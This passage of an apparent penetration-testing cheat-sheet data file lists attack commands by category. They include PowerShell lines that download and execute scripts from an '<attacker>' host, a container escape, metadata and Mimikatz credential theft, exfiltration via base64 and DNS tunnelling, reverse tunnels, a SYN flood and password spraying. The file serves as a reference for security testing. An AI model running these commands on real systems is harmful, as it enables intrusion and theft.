        desc: "Probe discovered subdomains for live web servers",
      },
      {
        cmd: "dirsearch -u http://<target> -e php,asp,aspx,jsp,html,js,txt",
        desc: "Directory brute-force with dirsearch and multiple extensions",
      },
      {
        cmd: "cewl http://<target> -d 3 -m 5 -w custom_wordlist.txt",
        desc: "Generate a custom wordlist by spidering the target website",
      },
      {
        cmd: "wafw00f http://<target>",
        desc: "Detect Web Application Firewalls (WAF) in front of the target",
      },
      {
        cmd: "arjun -u http://<target>/endpoint",
        desc: "Discover hidden GET/POST parameters on an endpoint",
      },
      {
        cmd: "hakrawler -url http://<target> -depth 3",
        desc: "Crawl web application and extract URLs, endpoints, and JS files",
      },
      {
        cmd: "katana -u http://<target> -d 3 -jc",
        desc: "Crawl with JavaScript rendering to discover dynamic endpoints",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 18. Docker Security  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Container Security",
    title: "Docker Security",
    items: [
      {
        cmd: "docker ps -a",
        desc: "List all containers including stopped ones",
      },
      {
        cmd: "docker images",
        desc: "List all locally stored Docker images",
      },
      {
        cmd: "docker inspect <container>",
        desc: "View detailed configuration of a container",
        example: "docker inspect web_app",
      },
      {
        cmd: "docker exec -it <container> /bin/bash",
        desc: "Get an interactive shell inside a running container",
        example: "docker exec -it web_app /bin/bash",
      },
      {
        cmd: "docker logs <container>",
        desc: "View stdout/stderr logs from a container",
      },
      {
        cmd: "docker cp <container>:/path/file ./file",
        desc: "Copy a file from a container to the host",
        example: "docker cp web_app:/etc/passwd ./passwd",
      },
      {
        cmd: "docker history <image>",
        desc: "Show the build history and layers of an image",
        example: "docker history myapp:latest",
      },
      {
        cmd: "docker save <image> -o image.tar",
        desc: "Export an image to a tar archive for offline analysis",
      },
      {
        cmd: "docker run -v /:/host -it alpine chroot /host",
        desc: "Mount host filesystem in container (container escape via volume)",
      },
      {
        cmd: "docker run --privileged -it alpine",
        desc: "Run a privileged container (full host access -- dangerous)",
      },
      {
        cmd: "docker run --pid=host -it alpine",
        desc: "Share host PID namespace (can see all host processes)",
      },
      {
        cmd: "docker run --net=host -it alpine",
        desc: "Share host network namespace (bypass container network isolation)",
      },
      {
        cmd: "find / -name 'docker.sock' 2>/dev/null",
        desc: "Find exposed Docker sockets (potential escape vector)",
      },
      {
        cmd: "curl -s --unix-socket /var/run/docker.sock http://localhost/version",
        desc: "Query Docker API via exposed socket",
      },
      {
        cmd: "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json",
        desc: "List containers via Docker API socket",
      },
      {
        cmd: "docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker",
        desc: "Access host Docker daemon from within a container",
      },
      {
        cmd: "trivy image <image>",
        desc: "Scan a Docker image for known vulnerabilities",
        example: "trivy image nginx:latest",
      },
      {
        cmd: "docker network ls",
        desc: "List all Docker networks",
      },
      {
        cmd: "docker network inspect bridge",
        desc: "Inspect the default bridge network for container IPs",
      },
      {
        cmd: "cat /proc/1/cgroup 2>/dev/null | grep docker",
        desc: "Detect if running inside a Docker container",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 19. Kubernetes Security  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Container Security",
    title: "Kubernetes Security",
    items: [
      {
        cmd: "kubectl get pods --all-namespaces",
        desc: "List all pods across all namespaces",
      },
      {
        cmd: "kubectl get secrets --all-namespaces",
        desc: "List all secrets across all namespaces",
      },
      {
        cmd: "kubectl get secrets <name> -o jsonpath='{.data}'",
        desc: "Extract secret data (base64 encoded)",
      },
      {
        cmd: "kubectl describe pod <pod>",
        desc: "Show detailed configuration of a specific pod",
      },
      {
        cmd: "kubectl exec -it <pod> -- /bin/bash",
        desc: "Get an interactive shell inside a running pod",
      },
      {
        cmd: "kubectl logs <pod>",
        desc: "View logs from a specific pod",
      },
      {
        cmd: "kubectl get serviceaccounts --all-namespaces",
        desc: "List all service accounts",
      },
      {
        cmd: "kubectl auth can-i --list",
        desc: "List permissions for the current service account",
      },
      {
        cmd: "kubectl auth can-i create pods",
        desc: "Check if current account can create pods",
      },
      {
        cmd: "kubectl get clusterroles",
        desc: "List all cluster roles for RBAC analysis",
      },
      {
        cmd: "kubectl get clusterrolebindings",
        desc: "List cluster role bindings to find privileged accounts",
      },
      {
        cmd: "kubectl get networkpolicies --all-namespaces",
        desc: "Check for network policies (or lack thereof)",
      },
      {
        cmd: "kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{\"\\t\"}{.spec.containers[*].securityContext}{\"\\n\"}{end}'",
        desc: "Check security contexts of all pods",
      },
      {
        cmd: "kubectl run test --image=alpine --restart=Never -it --rm -- /bin/sh",
        desc: "Spawn an ephemeral pod for testing cluster access",
      },
      {
        cmd: "kubectl get nodes -o wide",
        desc: "List all nodes with IPs and OS info",
      },
      {
        cmd: "kubectl cluster-info",
        desc: "Display cluster endpoint and service addresses",
      },
      {
        cmd: "kubectl get pods -o jsonpath='{.items[*].spec.containers[*].image}'",
        desc: "List all container images running in the cluster",
      },
      {
        cmd: "curl -k https://<apiserver>:6443/api",
        desc: "Probe the Kubernetes API server directly",
      },
      {
        cmd: "curl -k https://<apiserver>:10250/pods",
        desc: "Query Kubelet API for pod listing (if unauthenticated)",
      },
      {
        cmd: "kubectl get psp",
        desc: "List Pod Security Policies (deprecated but still in use)",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 20. Cloud (AWS/Azure) Security  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Cloud Security",
    title: "Cloud (AWS/Azure) Security",
    items: [
      {
        cmd: "aws sts get-caller-identity",
        desc: "Verify current AWS identity (account, user, ARN)",
      },
      {
        cmd: "aws s3 ls",
        desc: "List all S3 buckets in the account",
      },
      {
        cmd: "aws s3 ls s3://<bucket> --recursive",
        desc: "List all objects in a specific S3 bucket recursively",
      },
      {
        cmd: "aws s3 cp s3://<bucket>/<key> ./local_file",
        desc: "Download a file from an S3 bucket",
      },
      {
        cmd: "aws iam list-users",
        desc: "List all IAM users in the AWS account",
      },
      {
        cmd: "aws iam list-roles",
        desc: "List all IAM roles in the AWS account",
      },
      {
        cmd: "aws iam list-attached-user-policies --user-name <user>",
        desc: "List policies attached to a specific IAM user",
      },
      {
        cmd: "aws iam get-policy-version --policy-arn <arn> --version-id v1",
        desc: "View the actual permissions in an IAM policy",
      },
      {
        cmd: "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress]' --output table",
        desc: "List EC2 instances with state and public IPs",
      },
      {
        cmd: "aws ec2 describe-security-groups",
        desc: "List all security groups and their inbound/outbound rules",
      },
      {
        cmd: "aws lambda list-functions",
        desc: "List all Lambda functions in the account",
      },
      {
        cmd: "aws lambda get-function --function-name <name>",
        desc: "Get Lambda function code and configuration",
      },
      {
        cmd: "aws ssm describe-parameters",
        desc: "List SSM Parameter Store entries (may contain secrets)",
      },
      {
        cmd: "aws ssm get-parameter --name <param> --with-decryption",
        desc: "Retrieve a decrypted SSM parameter value",
      },
      {
        cmd: "curl -s http://169.254.169.254/latest/meta-data/",
        desc: "Query EC2 instance metadata (SSRF target)",
      },
      {
        cmd: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        desc: "Retrieve IAM role credentials from instance metadata",
      },
      {
        cmd: "az login --identity",
        desc: "Authenticate using Azure Managed Identity",
      },
      {
        cmd: "az ad user list --query '[].{name:displayName,upn:userPrincipalName}'",
        desc: "List all Azure AD users",
      },
      {
        cmd: "az storage account list --query '[].{name:name,rg:resourceGroup}'",
        desc: "List all Azure Storage accounts",
      },
      {
        cmd: "az vm list --query '[].{name:name,rg:resourceGroup,ip:publicIps}' -o table",
        desc: "List all Azure VMs with resource groups and IPs",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 21. Bash Scripting for Pentest  (25 snippets)
  // ---------------------------------------------------------------
  {
    cat: "Scripting",
    title: "Bash Scripting for Pentest",
    items: [
      {
        cmd: "for ip in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$ip | grep 'bytes from' & done; wait",
        desc: "Parallel ping sweep across a /24 subnet",
      },
      {
        cmd: "for port in $(seq 1 1000); do (echo >/dev/tcp/<target>/$port) 2>/dev/null && echo \"Port $port open\"; done",
        desc: "Bash-native TCP port scanner (no external tools)",
        example: "for port in $(seq 1 1000); do (echo >/dev/tcp/10.10.10.5/$port) 2>/dev/null && echo \"Port $port open\"; done",
      },
      {
        cmd: "while read user; do id \"$user\" 2>/dev/null; done < users.txt",
        desc: "Check which users from a list exist on the system",
      },
      {
        cmd: "for f in $(find / -perm -4000 -type f 2>/dev/null); do echo \"SUID: $f\"; done",
        desc: "Enumerate and display all SUID binaries",
      },
      {
        cmd: "grep -rn 'password\\|passwd\\|secret\\|key' /var/www/ 2>/dev/null",
        desc: "Search web root recursively for credential strings",
      },
      {
        cmd: "find / -name '*.conf' -exec grep -l 'password' {} \\; 2>/dev/null",
        desc: "Find config files containing the word 'password'",
      },
      {
        cmd: "cat /etc/passwd | cut -d: -f1 | while read u; do crontab -l -u $u 2>/dev/null | grep -v '^#' && echo \"-- $u\"; done",
        desc: "List cron jobs for all users",
      },
      {
        cmd: "diff <(ls -la /usr/bin) <(ls -la /usr/sbin) | head -50",
        desc: "Compare binaries in /usr/bin vs /usr/sbin",
      },
      {
        cmd: "netstat -tulnp 2>/dev/null | awk '{print $4}' | grep -oP '\\d+$' | sort -un",
        desc: "Extract unique listening port numbers",
      },
      {
        cmd: "curl -s ifconfig.me",
        desc: "Quick check of public-facing IP address",
      },
      {
        cmd: "while read sub; do host \"$sub.example.com\" | grep 'has address' && echo \"$sub.example.com\"; done < subdomains.txt",
        desc: "DNS subdomain brute-force using host command",
      },
      {
        cmd: "for i in $(seq 1 254); do host 192.168.1.$i | grep 'name pointer' & done; wait",
        desc: "Reverse DNS lookup sweep across a /24 subnet",
      },
      {
        cmd: "ps aux | awk '{print $1}' | sort | uniq -c | sort -rn",
        desc: "Count processes per user (find outliers)",
      },
      {
        cmd: "find / -newer /tmp/timestamp -type f 2>/dev/null",
        desc: "Find files modified after a specific timestamp file",
      },
      {
        cmd: "ls -la /proc/*/exe 2>/dev/null | grep deleted",
        desc: "Find processes running from deleted binaries (possible malware)",
      },
      {
        cmd: "for user in $(cut -d: -f1 /etc/passwd); do echo \"$user:\"; find /home/$user -readable -type f 2>/dev/null | head -5; done",
        desc: "Find readable files in each user's home directory",
      },
      {
        cmd: "ss -tulnp | grep LISTEN | awk '{print $5}' | cut -d: -f2 | sort -un | while read p; do echo \"Port $p: $(lsof -i :$p -sTCP:LISTEN -P 2>/dev/null | tail -1 | awk '{print $1}')\"; done",
        desc: "Map listening ports to process names",
      },
      {
        cmd: "cat /etc/passwd | awk -F: '$3 == 0 {print $1}'",
        desc: "Find all accounts with UID 0 (root equivalents)",
      },
      {
        cmd: "find / -name authorized_keys -exec cat {} \\; 2>/dev/null",
        desc: "Dump all SSH authorized_keys files on the system",
      },
      {
        cmd: "last -a | head -20",
        desc: "Show recent login history with hostnames",
      },
      {
        cmd: "awk '/Failed password/ {print $(NF-3)}' /var/log/auth.log | sort | uniq -c | sort -rn | head",
        desc: "Analyze SSH brute-force attempts from auth.log",
      },
      {
        cmd: "openssl s_client -connect <target>:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'Subject:|DNS:'",
        desc: "Extract SSL certificate details and SANs from a target",
      },
      {
        cmd: "strings /proc/$(pgrep -f <process>)/environ 2>/dev/null",
        desc: "Dump environment variables of a running process",
      },
      {
        cmd: "tar czf - /etc /var/log /home 2>/dev/null | base64 | fold -w 76",
        desc: "Compress and base64-encode directories for exfiltration",
      },
      {
        cmd: "inotifywait -m /tmp -e create -e modify",
        desc: "Monitor a directory for file creation and modification events",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 22. Python for Pentest  (25 snippets)
  // ---------------------------------------------------------------
  {
    cat: "Scripting",
    title: "Python for Pentest",
    items: [
      {
        cmd: "python3 -c \"import socket; s=socket.socket(); s.settimeout(1); [print(f'Port {p} open') for p in range(1,1025) if s.connect_ex(('<target>',p))==0]\"",
        desc: "Quick TCP port scanner in one line",
      },
      {
        cmd: "from scapy.all import *; ans=sr1(IP(dst='<target>')/ICMP(), timeout=1); print('Host up' if ans else 'Host down')",
        desc: "ICMP ping check using Scapy",
      },
      {
        cmd: "import requests; r=requests.get('http://<target>'); print(r.headers)",
        desc: "Fetch and display HTTP response headers",
      },
      {
        cmd: "import requests; [print(r.url, r.status_code) for w in open('wordlist.txt') if (r:=requests.get(f'http://<target>/{w.strip()}')).status_code!=404]",
        desc: "Simple web directory brute-forcer",
      },
      {
        cmd: "from pwn import *; r=remote('<target>',<port>); r.interactive()",
        desc: "Connect to a remote service using pwntools",
      },
      {
        cmd: "import hashlib; print(hashlib.md5(b'password').hexdigest())",
        desc: "Generate an MD5 hash of a string",
      },
      {
        cmd: "import hashlib; print(hashlib.sha256(b'password').hexdigest())",
        desc: "Generate a SHA-256 hash of a string",
      },
      {
        cmd: "import base64; print(base64.b64encode(b'payload').decode())",
        desc: "Base64 encode a payload string",
      },
      {
        cmd: "import base64; print(base64.b64decode('cGF5bG9hZA==').decode())",
        desc: "Base64 decode an encoded string",
      },
      {
        cmd: "from Crypto.Cipher import AES; cipher=AES.new(key, AES.MODE_CBC, iv); print(cipher.decrypt(ciphertext))",
        desc: "AES-CBC decryption using PyCryptodome",
      },
      {
        cmd: "import subprocess; subprocess.run(['nmap','-sV','-p','1-1000','<target>'], capture_output=True, text=True)",
        desc: "Run nmap from Python and capture output",
      },
      {
        cmd: "import paramiko; ssh=paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()); ssh.connect('<target>',username='user',password='pass')",
        desc: "SSH connection automation using Paramiko",
      },
      {
        cmd: "from impacket.smbconnection import SMBConnection; conn=SMBConnection('<target>','<target>'); conn.login('',''); shares=conn.listShares(); [print(s['shi1_netname']) for s in shares]",
        desc: "Enumerate SMB shares using Impacket",
      },
      {
        cmd: "import jwt; token=jwt.encode({'admin':True},'secret',algorithm='HS256'); print(token)",
        desc: "Forge a JWT token with arbitrary claims",
      },
      {
        cmd: "import jwt; print(jwt.decode(token, options={'verify_signature':False}))",
        desc: "Decode a JWT without verifying the signature",
      },
      {
        cmd: "from http.server import HTTPServer, SimpleHTTPRequestHandler; HTTPServer(('0.0.0.0',8000),SimpleHTTPRequestHandler).serve_forever()",
        desc: "Start a Python HTTP server for file hosting",
      },
      {
        cmd: "import socket; s=socket.socket(); s.bind(('0.0.0.0',4444)); s.listen(1); c,a=s.accept(); print(f'Connection from {a}')",
        desc: "Simple TCP listener for catching reverse shells",
      },
      {
        cmd: "import itertools; [print(''.join(p)) for p in itertools.product('abc123',repeat=4)]",
        desc: "Generate all 4-character combinations from a charset",
      },
      {
        cmd: "import dns.resolver; answers=dns.resolver.resolve('<domain>','MX'); [print(r.exchange) for r in answers]",
        desc: "DNS MX record lookup using dnspython",
      },
      {
        cmd: "from scapy.all import *; sniff(filter='tcp port 80', prn=lambda p: p.summary(), count=10)",
        desc: "Capture and display 10 HTTP packets with Scapy",
      },
      {
        cmd: "from scapy.all import *; send(IP(dst='<target>')/TCP(dport=80,flags='S'), count=100)",
        desc: "SYN flood using Scapy (for authorized testing only)",
      },
      {
        cmd: "import requests; s=requests.Session(); s.post('http://<target>/login',data={'user':'admin','pass':'test'}); r=s.get('http://<target>/admin'); print(r.text)",
        desc: "Session-based login and authenticated page access",
      },
      {
        cmd: "import re; emails=re.findall(r'[\\w.+-]+@[\\w-]+\\.[\\w.]+', open('page.html').read()); print(emails)",
        desc: "Extract email addresses from an HTML file",
      },
      {
        cmd: "from PIL import Image; img=Image.open('stego.png'); print(img.info)",
        desc: "Read image metadata for steganography analysis",
      },
      {
        cmd: "import binascii; print(binascii.hexlify(open('binary','rb').read()[:64]))",
        desc: "Hex dump the first 64 bytes of a binary file",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 23. PowerShell for Pentest  (25 snippets)
  // ---------------------------------------------------------------
  {
    cat: "Scripting",
    title: "PowerShell for Pentest",
    items: [
      {
        cmd: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10",
        desc: "List top 10 processes by CPU usage",
      },
      {
        cmd: "Get-Service | Where-Object {$_.Status -eq 'Running'}",
        desc: "List all currently running Windows services",
      },
      {
        cmd: "Get-LocalUser",
        desc: "List all local user accounts on the system",
      },
      {
        cmd: "Get-LocalGroupMember -Group 'Administrators'",
        desc: "List members of the local Administrators group",
      },
      {
        cmd: "Get-NetTCPConnection -State Listen",
        desc: "Show all listening TCP connections",
      },
      {
        cmd: "Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.xml,*.config -ErrorAction SilentlyContinue | Select-String -Pattern 'password'",
        desc: "Search the filesystem for files containing 'password'",
      },
      {
        cmd: "Get-ChildItem -Path Env:",
        desc: "List all environment variables",
      },
      {
        cmd: "Get-WmiObject Win32_Product | Select-Object Name,Version",
        desc: "List installed programs and versions",
      },
      {
        cmd: "Get-HotFix | Sort-Object InstalledOn -Descending",
        desc: "List installed hotfixes sorted by date",
      },
      {
        cmd: "Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'}",
        desc: "List all enabled scheduled tasks",
      },
      {
        cmd: "(New-Object Net.WebClient).DownloadString('http://<attacker>/script.ps1') | IEX",
        desc: "Download and execute a PowerShell script in memory",
      },
      {
        cmd: "IEX (Invoke-WebRequest -Uri 'http://<attacker>/script.ps1' -UseBasicParsing).Content",
        desc: "Download and execute a script via Invoke-WebRequest",
      },
      {
        cmd: "powershell -ep bypass -c \"Import-Module .\\PowerView.ps1; Get-DomainUser\"",
        desc: "Load PowerView and enumerate domain users",
      },
      {
        cmd: "Get-ADUser -Filter * -Properties * | Select-Object SamAccountName,Description",
        desc: "List all AD users with descriptions (may contain passwords)",
      },
      {
        cmd: "Get-ADComputer -Filter * -Properties * | Select-Object Name,OperatingSystem,IPv4Address",
        desc: "List all AD computers with OS and IP info",
      },
      {
        cmd: "Get-ADGroup -Filter * | Select-Object Name",
        desc: "List all Active Directory groups",
      },
      {
        cmd: "Test-NetConnection -ComputerName <target> -Port 445",
        desc: "Test connectivity to a specific port (like telnet)",
      },
      {
        cmd: "1..1024 | ForEach-Object { $t=New-Object Net.Sockets.TcpClient; if($t.ConnectAsync('<target>',$_).Wait(100)){\"Port $_ open\"}; $t.Close() }",
        desc: "Fast TCP port scanner in PowerShell",
      },
      {
        cmd: "Get-Acl 'C:\\sensitive_folder' | Format-List",
        desc: "Check NTFS permissions on a file or directory",
      },
      {
        cmd: "[System.IO.File]::ReadAllText('C:\\Users\\user\\Desktop\\flag.txt')",
        desc: "Read a file using .NET methods (bypass some restrictions)",
      },
      {
        cmd: "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'",
        desc: "Check for autologon credentials in the registry",
      },
      {
        cmd: "Get-ChildItem -Path 'HKLM:\\SOFTWARE' -Recurse -ErrorAction SilentlyContinue | Get-ItemProperty | Where-Object {$_.ToString() -match 'password'}",
        desc: "Search registry for password values",
      },
      {
        cmd: "$cred = New-Object System.Management.Automation.PSCredential('admin',(ConvertTo-SecureString 'P@ss' -AsPlainText -Force)); Invoke-Command -ComputerName <target> -Credential $cred -ScriptBlock {whoami}",
        desc: "Remote command execution with explicit credentials",
      },
      {
        cmd: "Invoke-Mimikatz -DumpCreds",
        desc: "Invoke-Mimikatz to dump credentials from memory (PowerSploit)",
      },
      {
        cmd: "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX(command)'))",
        desc: "Base64 encode a PowerShell command for -EncodedCommand use",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 24. Git Security  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Source Code Security",
    title: "Git Security",
    items: [
      {
        cmd: "git log --all --oneline",
        desc: "View condensed commit history across all branches",
      },
      {
        cmd: "git log --diff-filter=D --summary",
        desc: "Find deleted files in git history (may contain secrets)",
      },
      {
        cmd: "git log -p -- <file>",
        desc: "Show full patch history for a specific file",
        example: "git log -p -- config/database.yml",
      },
      {
        cmd: "git log --all -p -S 'password'",
        desc: "Search all commits for additions/removals of 'password'",
      },
      {
        cmd: "git log --all -p -S 'API_KEY'",
        desc: "Search all commits for API key references",
      },
      {
        cmd: "git show <commit>:<file>",
        desc: "View a file at a specific commit",
        example: "git show HEAD~5:.env",
      },
      {
        cmd: "git diff HEAD~10 HEAD -- '*.env' '*.cfg' '*.yml'",
        desc: "Diff config files over the last 10 commits",
      },
      {
        cmd: "git stash list && git stash show -p stash@{0}",
        desc: "Check stashed changes for sensitive data",
      },
      {
        cmd: "git branch -a",
        desc: "List all local and remote branches",
      },
      {
        cmd: "git tag -l",
        desc: "List all tags (check old release tags for secrets)",
      },
      {
        cmd: "trufflehog git file://./",
        desc: "Scan a local git repo for high-entropy secrets using TruffleHog",
      },
      {
        cmd: "trufflehog github --repo=https://github.com/<org>/<repo>",
        desc: "Scan a GitHub repo for leaked secrets",
      },
      {
        cmd: "gitleaks detect -v",
        desc: "Run Gitleaks to detect secrets in the repository",
      },
      {
        cmd: "gitleaks detect --source . --report-path report.json",
        desc: "Run Gitleaks and save findings to a JSON report",
      },
      {
        cmd: "git-dumper http://<target>/.git/ ./dumped_repo",
        desc: "Dump an exposed .git directory from a web server",
      },
      {
        cmd: "git fsck --unreachable",
        desc: "Find unreachable objects that may contain deleted secrets",
      },
      {
        cmd: "git reflog",
        desc: "View reference log (find commits removed by rebase/reset)",
      },
      {
        cmd: "git cat-file -p <hash>",
        desc: "Print the contents of a git object by its hash",
      },
      {
        cmd: "git ls-files --others --ignored --exclude-standard",
        desc: "List ignored files that might contain secrets",
      },
      {
        cmd: "grep -rn 'BEGIN.*PRIVATE KEY' .",
        desc: "Search the repo for private keys that were accidentally committed",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 25. Network Pivoting  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Pivoting",
    title: "Network Pivoting",
    items: [
      {
        cmd: "ssh -D 9050 user@<pivot>",
        desc: "Create a SOCKS5 proxy through the pivot host",
        example: "ssh -D 9050 user@10.10.10.5",
      },
      {
        cmd: "proxychains4 nmap -sT -Pn <internal_target>",
        desc: "Scan internal hosts through a SOCKS proxy",
      },
      {
        cmd: "proxychains4 curl http://<internal>",
        desc: "Access internal web services through a SOCKS proxy",
      },
      {
        cmd: "sshuttle -r user@<pivot> 172.16.0.0/24 -x <pivot>",
        desc: "VPN-like tunnel through pivot excluding the pivot itself",
      },
      {
        cmd: "chisel server --reverse --port 8080",
        desc: "Start Chisel reverse tunnel server on attacker",
      },
      {
        cmd: "chisel client <attacker>:8080 R:1080:socks",
        desc: "Create reverse SOCKS proxy from pivot to attacker",
      },
      {
        cmd: "chisel client <attacker>:8080 R:3389:172.16.0.5:3389",
        desc: "Forward internal RDP to attacker via Chisel",
      },
      {
        cmd: "socat tcp-listen:3389,reuseaddr,fork tcp:172.16.0.5:3389",
        desc: "Port forward on pivot to reach internal RDP",
      },
      {
        cmd: "ssh -L 445:172.16.0.5:445 user@<pivot>",
        desc: "Forward SMB from internal host through the pivot",
      },
      {
        cmd: "ssh -R 9999:localhost:22 user@<attacker>",
        desc: "Reverse SSH tunnel: make pivot's SSH accessible on attacker",
      },
      {
        cmd: "meterpreter > run autoroute -s 172.16.0.0/24",
        desc: "Add route through Meterpreter session for internal subnet",
      },
      {
        cmd: "meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.0.5",
        desc: "Forward internal RDP through Meterpreter session",
      },
      {
        cmd: "meterpreter > run auxiliary/server/socks_proxy",
        desc: "Start a SOCKS proxy through the Meterpreter session",
      },
      {
        cmd: "rpivot server --server-port 9999 --server-ip 0.0.0.0",
        desc: "Start rpivot server on attacker for reverse SOCKS",
      },
      {
        cmd: "rpivot client --server-ip <attacker> --server-port 9999",
        desc: "Run rpivot client on pivot to connect back",
      },
      {
        cmd: "plink.exe -ssh -D 1080 user@<attacker>",
        desc: "Create SOCKS proxy from Windows pivot using plink",
      },
      {
        cmd: "netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.0.5",
        desc: "Windows port forward to internal SMB",
      },
      {
        cmd: "dnscat2-client <attacker_domain>",
        desc: "Establish a DNS tunnel for covert data exfiltration",
      },
      {
        cmd: "ssh -w 0:0 root@<pivot>",
        desc: "Create a Layer 3 VPN tunnel via SSH TUN interface",
      },
      {
        cmd: "ligolo-ng proxy -selfcert",
        desc: "Start Ligolo-ng proxy on attacker for transparent pivoting",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 26. Password Attacks  (20 techniques)
  // ---------------------------------------------------------------
  {
    cat: "Password Cracking",
    title: "Password Attacks",
    items: [
      {
        cmd: "cewl http://<target> -d 3 -m 6 -w wordlist.txt",
        desc: "Generate a custom wordlist by crawling the target website",
      },
      {
        cmd: "crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt",
        desc: "Generate a wordlist of 8-12 char strings from a charset",
      },
      {
        cmd: "crunch 6 6 -t @@%%^^ -o wordlist.txt",
        desc: "Generate wordlist with pattern: 2 lower, 2 digits, 2 special",
      },
      {
        cmd: "cupp -i",
        desc: "Interactive CUPP to generate target-specific password list",
      },
      {
        cmd: "john --wordlist=rockyou.txt --rules hashes.txt",
        desc: "Crack with wordlist and rule-based mutations",
      },
      {
        cmd: "hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule",
        desc: "NTLM wordlist attack with best64 rule mangling",
      },
      {
        cmd: "medusa -h <target> -u admin -P passwords.txt -M ssh",
        desc: "Brute-force SSH with Medusa",
        example: "medusa -h 10.10.10.5 -u admin -P rockyou.txt -M ssh",
      },
      {
        cmd: "ncrack -p 22 --user admin -P passwords.txt <target>",
        desc: "Brute-force SSH with Ncrack",
        example: "ncrack -p 22 --user admin -P rockyou.txt 10.10.10.5",
      },
      {
        cmd: "crowbar -b rdp -s <target>/32 -u admin -C passwords.txt",
        desc: "Brute-force RDP with Crowbar",
      },
      {
        cmd: "sprayhound -U users.txt -p 'Spring2024!' -d CORP.LOCAL -dc 10.10.10.5",
        desc: "Smart password spraying against Active Directory",
      },
      {
        cmd: "hashid '<hash>'",
        desc: "Identify the hash type of an unknown hash string",
        example: "hashid '5f4dcc3b5aa765d61d8327deb882cf99'",
      },
      {
        cmd: "hash-identifier",
        desc: "Interactive tool to identify hash types",
      },
      {
        cmd: "python3 -c \"import crypt; print(crypt.crypt('password', '\\$6\\$salt'))\"",
        desc: "Generate a SHA-512 crypt hash for /etc/shadow",
      },
      {
        cmd: "openssl passwd -6 -salt xyz password",
        desc: "Generate SHA-512 password hash using OpenSSL",
      },
      {
        cmd: "crackmapexec smb <target> -u users.txt -p 'Password1' --continue-on-success",
        desc: "Password spray against SMB",
      },
      {
        cmd: "hydra -L users.txt -p 'Summer2024!' <target> smb",
        desc: "Spray a single password across multiple users via Hydra",
      },
      {
        cmd: "python3 -c \"import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt()).decode())\"",
        desc: "Generate a bcrypt hash for testing",
      },
      {
        cmd: "responder -I eth0 -wrf",
        desc: "Capture NetNTLM hashes by poisoning LLMNR/NBT-NS",
      },
      {
        cmd: "hashcat -m 5600 captured_hashes.txt rockyou.txt",
        desc: "Crack captured NTLMv2 hashes with Hashcat",
      },
      {
        cmd: "pypykatz lsa minidump lsass.dmp",
        desc: "Extract credentials from an LSASS memory dump (offline)",
      },
    ],
  },

  // ---------------------------------------------------------------
  // 27. Wireless Attacks  (20 commands)
  // ---------------------------------------------------------------
  {
    cat: "Wireless",
    title: "Wireless Attacks",
    items: [
      {
        cmd: "airmon-ng start wlan0",
        desc: "Put wireless interface into monitor mode",
      },
      {
        cmd: "airmon-ng stop wlan0mon",
        desc: "Stop monitor mode and restore managed mode",
      },
      {
        cmd: "airodump-ng wlan0mon",
        desc: "Scan for nearby wireless networks and clients",
      },
      {
        cmd: "airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon",
        desc: "Capture traffic from a specific access point",
        example: "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon",
      },
      {
        cmd: "aireplay-ng -0 5 -a <bssid> -c <client> wlan0mon",
        desc: "Send deauthentication packets to force a handshake capture",
        example: "aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon",
      },
      {
        cmd: "aircrack-ng -w rockyou.txt capture-01.cap",
        desc: "Crack WPA/WPA2 handshake with a wordlist",
      },
      {
        cmd: "aircrack-ng -b <bssid> -w rockyou.txt capture-01.cap",
        desc: "Crack handshake for a specific BSSID",
      },
      {
        cmd: "aireplay-ng -1 0 -a <bssid> -e <essid> wlan0mon",
        desc: "Fake authentication with an access point (WEP attacks)",
      },
      {
        cmd: "aireplay-ng -3 -b <bssid> wlan0mon",
        desc: "ARP replay attack for WEP cracking",
      },
      {
        cmd: "wash -i wlan0mon",
        desc: "Scan for WPS-enabled access points",
      },
      {
        cmd: "reaver -i wlan0mon -b <bssid> -vv",
        desc: "Brute-force WPS PIN to recover WPA passphrase",
        example: "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv",
      },
      {
        cmd: "bully wlan0mon -b <bssid> -c <channel>",
        desc: "Alternative WPS brute-force tool",
        example: "bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6",
      },
      {
        cmd: "wifite --kill",
        desc: "Automated wireless attack tool (kills conflicting processes)",
      },
      {
        cmd: "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1",
        desc: "Capture PMKID and EAPOL handshakes",
      },
      {
